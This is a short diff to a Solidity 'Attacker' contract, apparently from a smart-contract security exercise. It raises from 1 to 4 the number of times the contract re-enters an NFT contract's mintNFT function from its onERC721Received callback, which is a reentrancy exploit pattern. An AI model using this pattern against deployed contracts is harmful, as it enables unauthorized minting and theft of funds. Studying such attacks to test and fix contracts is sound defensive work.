@@ -27,7 +27,7 @@ contract Attacker is IERC721Receiver {
         uint,
         bytes memory
     ) public override returns (bytes4) {
-        if (reentrancyCount < 1) {
+        if (reentrancyCount < 4) {
             ++reentrancyCount;
             nft.mintNFT{value: DEFAULT_PRICE}();
         }
